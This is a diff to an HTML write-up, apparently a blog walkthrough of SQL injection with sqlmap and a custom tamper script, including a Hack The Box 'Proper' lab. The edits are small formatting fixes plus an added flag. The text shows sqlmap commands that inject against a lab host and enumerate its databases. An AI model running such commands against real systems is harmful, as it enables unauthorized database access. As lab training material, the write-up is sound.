@@ -272,7 +272,7 @@
             </li>
             <li>
                 Then we can use <strong>sqlmap</strong> as:
-                <pre><code class="code-style">sqlmap -u http://www.example.com?id=1 -p id --tamper=&lt;directory&gt;/custom_tamper.py</code></pre>
+                <pre><code class="language-bash">sqlmap -u http://www.example.com?id=1 -p id --tamper=&lt;directory&gt;/custom_tamper.py</code></pre>
             </li>
         </ul>
         <h2 <strong style="color:red">HTB: Proper Scenario</strong></h2>
@@ -388,14 +388,14 @@
             <li>
                 Then exploit with the following sqlmap command:
                 <pre><code class="language-bash">
-    sqlmap -u "http://10.10.10.231/products-ajax.php?order=id+desc" --tamper=/customtamper/custom_tamper.py --dbs
+    sqlmap -u "http://10.10.10.231/products-ajax.php?order=id+desc" --tamper=/customtamper/custom_tamper.py --skip-urlencode --dbs 
                 </code></pre>
             </li>
             <li>
               As we can notice in the sqlmap command, I removed the <code class="code-style">h</code> parameter, which will be added with the custom values generated through our tamper script.		    
           </li>
           <li>
-              <code class="code-style">--skip-urlencode</code> option to avoid <code class="code-style">h</code> parameter from being a part from the encoded payload, and be a separated parameter as required		    
+              <code class="code-style">--skip-urlencode</code> option to avoid <code class="code-style">h</code> parameter from being a part from the encoded payload, and be a separated parameter as required.		    
           </li>
         </ul>
         <h3>Refrences:</h3>
